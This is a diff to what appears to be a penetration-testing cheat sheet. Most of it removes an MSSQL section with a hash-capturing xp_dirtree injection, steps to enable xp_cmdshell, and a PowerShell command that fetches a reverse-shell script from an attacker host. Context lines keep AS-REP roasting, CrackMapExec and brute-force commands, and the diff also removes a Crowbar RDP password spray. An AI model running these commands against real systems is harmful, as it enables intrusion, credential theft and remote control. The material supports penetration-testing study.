@@ -376,76 +376,6 @@ run responder and attemp to capture hash.
 '+EXEC+master.sys.xp_dirtree+'\\AttackerIP\share--
 ```
 
-Login it to mssql remotely
-
-```
-sqsh -S $ip -U sa -P <PASSWORD>
-```
-
-alternatively use
-
-```
-mssqlclient.py user:password@$ip -windows-auth
-```
-
-or without --windows-auth
-
-```
-mssqlclient.py user:password@$ip
-```
-
-Check for users with SA level permissions (users that can enable xp\_cmdshell)
-
-```
-select IS_SRVROLEMEMBER ('sysadmin')
-```
-
-Run after spinning up an smbserver to capture hash
-
-```
-exec xp_dirtree '\\<attacker ip>\<share name>\',1,1
-```
-
-**Check if xp\_cmdshell is enabled**
-
-```
-SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
-```
-
-**Show Advanced Options**
-
-```
-sp_configure 'show advanced options', '1'
-```
-
-```
-RECONFIGURE
-```
-
-**Enable xp\_cmdshell**
-
-```
-sp_configure 'xp_cmdshell', '1'
-```
-
-```
-RECONFIGURE
-```
-
-```
-EXEC master..xp_cmdshell 'whoami'
-```
-
-```
-xp_cmdshell powershell iex(new-objectnet.webclient).downloadstring(\"http://AttackerIP/Invoke-PowerShellTcp.ps1\")
-```
-
-after every command
-
-```
-go
-```
-
 **Enumerating MSSQL**
 
 Get all available databases
@@ -572,9 +502,11 @@ kerbrute userenum users.txt -d example.com --dc 127.0.0.1
 
 This will get a "ticket" meaning the users have the "UF\_DONT\_REQUIRE\_PREAUTH" set and will return a hash to crack
 
+{% code overflow="wrap" %}
 ```
 python3 /usr/local/bin/GetNPUsers.py $domain/ -no-pass -usersfile users.txt -dc-ip $ip
 ```
+{% endcode %}
 
 #### Kerberosting
 
@@ -1071,21 +1003,9 @@ _try all three if needed smbexec,psexec,wmiexec_ (if you cannot upload ry tools 
 * cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' s --local-group
 * cme smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt
 
-### NFS
-
-showmount -e -- Check shares
-
 ### MySQL
 
 use hydra with `rockyou.txt` and with `root` as the user for a less complicated password attack
-
-### RDP
-
-Password attacks using Crowbar
-
-```
-crowbar -b rdp -s 10.11.1.0/24 -U ../usernames.txt -C ../passwords.txt -n 1 -d
-```
 
 ## Linux Privilege Escalation
 
